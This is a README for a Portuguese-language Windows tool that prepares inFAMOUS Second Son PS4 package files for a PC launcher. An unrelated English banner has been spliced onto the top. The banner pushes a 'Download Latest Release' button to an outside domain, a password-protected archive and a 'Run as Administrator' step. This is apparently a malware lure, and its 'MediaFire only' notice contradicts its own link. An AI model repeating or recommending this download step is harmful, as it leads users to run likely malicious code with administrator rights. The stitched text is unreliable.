<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## O que ele faz

| Entrada | Comportamento |
| --- | --- |
| `.part1.rar`, `.part2.rar`, `.part3.rar` | Aceita selecionar uma ou todas as partes; começa pela primeira e lê o conjunto uma vez. |
| `.zip.001`, `.zip.002`, `.zip.003` | Reconhece volumes ZIP divididos. |
| Vários ZIPs independentes | Extrai em sequência para a mesma área temporária. |
| `.pkg` compatível | Extrai o PFS com a correção de leitura integral de setores. |
| Base + update | Confere título/tipo/versão dos PKGs e aplica os arquivos do update por cima da base. |

- Português (Brasil) e English, com troca sem reiniciar e preferência salva.
- Tema escuro, destaque laranja e ícone de extração próprio.
- Senhas separadas para base e update.
- Cancelamento, registro do andamento e verificação de espaço por etapa.
- Leitura direta de PKG em RAR5 armazenado compatível, evitando uma cópia intermediária.
- Arquivos originais preservados.
- Instalações existentes protegidas: o destino precisa ser uma pasta nova.
- Pasta final publicada somente depois da preparação e da verificação estrutural.

## Como usar

1. Obtenha o **pacote compilado completo** fornecido na release. O ZIP de código-fonte do GitHub não contém o aplicativo compilado.
2. Extraia todo o pacote e abra `Preparador-inFAMOUS.exe`. Em **Idioma / Language**, escolha **Português** ou **English**.
3. Em **Jogo base**, clique em **Selecionar partes**. Use **Ctrl** ou **Shift** para escolher os volumes juntos.
4. Selecione o **update 1.07** no campo separado.
5. Informe as senhas, se houver, e escolha uma **pasta final nova**.
6. Clique em **Extrair e unir**. Ao concluir, selecione a pasta criada no launcher do iss_pc.

Mantenha todos os volumes completos na mesma pasta e com os nomes originais. O programa não baixa partes ausentes. DLCs extras são ignorados e informados no log.

### E se o jogo veio de outro pacote ou já está em uma pasta?

O formato e o conteúdo dos arquivos determinam a compatibilidade. O preparador é direcionado a **inFAMOUS Second Son, região/título CUSA00223, com update 1.07**. O teste integral foi feito com um conjunto específico; outros pacotes não têm compatibilidade garantida.

| O que você tem | Como proceder |
| --- | --- |
| Uma pasta contendo RARs, ZIPs ou um PKG | Selecione os **arquivos dentro da pasta** nos campos de base e update. Os volumes precisam estar completos. |
| Um único RAR ou ZIP | Selecione o arquivo. Não é obrigatório o jogo vir em três partes. O conteúdo ainda precisa ser compatível. |
| Jogo já extraído, com `eboot.bin` e as pastas do jogo | A versão atual **não aceita uma pasta extraída como entrada**. Se a instalação já estiver completa e com o update exigido, selecione essa pasta diretamente no launcher iss_pc. |
| Base já extraída e update ainda separado | A versão atual não aplica um update sobre uma pasta existente. Para preparar pelo aplicativo, use os arquivos de base e update aceitos e escolha um destino novo. |
| Outra região, outro jogo ou outra versão de update | Não há suporte garantido. Não renomeie pastas ou arquivos para tentar torná-los compatíveis. |

Ter apenas `eboot.bin` não comprova que a instalação esteja completa. O launcher também depende dos demais arquivos esperados e da versão correta do jogo. O preparador não converte regiões, não corrige qualquer pacote e não transforma um jogo diferente em uma instalação compatível.

### Requisitos e espaço

- Windows x64 com **.NET Framework 4.8**.
- Não exige PowerShell para **usar** o executável.
- Unidade local com espaço para o jogo extraído e para os temporários.
- Uma preparação completa a partir de arquivos comprimidos pode exigir aproximadamente **50–60 GB livres**, conforme o conteúdo. A instalação final ocupa menos que o pico da extração.

Os temporários ficam ao lado do destino em `.iss-preparador-<identificador>`. O programa tenta limpá-los ao concluir, cancelar ou falhar. Se não conseguir, informa o caminho no log.

### Idioma

Na primeira abertura, o programa usa português em um Windows configurado em português e inglês nos demais casos. A escolha é salva em `%LOCALAPPDATA%\Preparador-inFAMOUS\language.txt`. Trocar de idioma mantém os caminhos, senhas e seleções. O seletor fica desativado durante a preparação. Logs já escritos mantêm o idioma original. Botões dos seletores de arquivos do Windows e mensagens de bibliotecas externas podem seguir o idioma do próprio sistema ou componente.

## Verificação

A versão **0.7 passou por 18 testes funcionais**, incluindo preferência salva, troca nos dois sentidos sem perda de entradas, erros e logs traduzidos, extração/união em inglês e renderização das duas interfaces. A extração integral abaixo foi feita na 0.6; não foi repetida para a revisão de idiomas.

A versão 0.6 passou por **15 verificações funcionais** e por uma **extração integral de base e update 1.07**, usando o executável em modo de automação e o mesmo motor da interface.

## Compilar

Use Windows x64 e **PowerShell 7.6**, a versão usada na validação. O compilador Roslyn acompanha o PowerShell; não é necessário instalar um SDK .NET separado para este procedimento.

```powershell
pwsh -NoProfile -File .\scripts\build.ps1
```

Saída: `dist/Preparador-inFAMOUS/Preparador-inFAMOUS.exe`.

Para testar com arquivos pequenos de exemplo, sem precisar de jogos:

```powershell
pwsh -NoProfile -File .\scripts\test.ps1
```

O teste deixa seus exemplos e relatórios em `artifacts/tests`. As amostras RAR opcionais precisam ser fornecidas separadamente; os demais exemplos são gerados localmente.

## Limitações

- Suporte direcionado a **CUSA00223 / update 1.07**.
- A biblioteca precisa conseguir recuperar a chave PFS do PKG. Não é um extrator universal de pacotes de PS4.
- Não monta DLCs e não altera o launcher oficial.
- A verificação final confere estrutura, arquivos essenciais e tamanhos de saída; não compara todo o jogo contra hashes de referência.
- O programa prepara arquivos; não oferece otimização de FPS.
- Em computadores que restringem caminhos longos, prefira um destino curto, como `C:\Jogos\Game-CUSA00223`.

## Créditos e licenças

| Componente | Origem / licença |
| --- | --- |


---

# Contribuir

Issues e contribuições em português ou inglês são bem-vindas. / Issues and contributions in Portuguese or English are welcome.

English: describe the issue or change, build with `scripts/build.ps1`, run `scripts/test.ps1`, and open a pull request with the results. For visual changes, include a screenshot without personal paths. Never submit games, commercial packages, passwords or private information. Changes must preserve input files and protect existing output installations. User-facing translations are maintained in `src/Localization.cs`.

1. Abra uma issue descrevendo o problema ou a melhoria.
2. Faça a alteração em uma branch própria.
3. Compile com `scripts/build.ps1` e execute `scripts/test.ps1` no Windows.
4. Abra um pull request explicando a mudança e os resultados verificados.

Para mudanças visuais, inclua uma captura sem caminhos pessoais. Para mudanças no extrator, prefira pequenos exemplos gerados em vez de arquivos comerciais.

Não envie arquivos de jogos, pacotes comerciais, senhas, dados pessoais ou chaves privadas. As chaves de formato já presentes no projeto público LibOrbisPkg pertencem ao código original da dependência; mantenha os créditos e as licenças existentes.

O aplicativo deve preservar os arquivos de entrada e recusar sobrescrever uma instalação existente. Mudanças nessas garantias precisam ser discutidas antes.


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
